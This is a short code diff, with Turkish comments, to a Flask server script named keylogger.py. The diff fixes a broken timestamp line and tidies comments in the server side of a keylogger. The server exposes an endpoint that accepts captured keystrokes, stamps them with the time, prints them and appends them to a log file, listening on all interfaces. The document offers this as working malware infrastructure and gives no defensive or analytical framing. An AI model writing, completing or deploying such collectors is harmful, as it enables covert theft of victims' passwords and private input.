@@ -1,4 +1,4 @@
-# sunucu tarafı, indirdikten sonra başlatmak için python3 keylogger.py
+# Sunucu tarafı — başlatmak için: python3 keylogger.py
 from flask import Flask, request
 import datetime
 
@@ -13,12 +13,20 @@ def home():
 def log_key():
     data = request.get_json()
     key_data = data.get('key')
-    timestamp = datetime.datetime.now().strftime("%Y->
+    
+    # Zaman damgası oluştur
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"[{timestamp}] {key_data}"
-    print(log_entry)  # Terminale yaz
+    
+    # Terminale yaz
+    print(log_entry)
+    
+    # Log dosyasına ekle
     with open(LOG_FILE, "a") as f:
         f.write(log_entry + "\n")
+    
     return "Logged", 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
+    
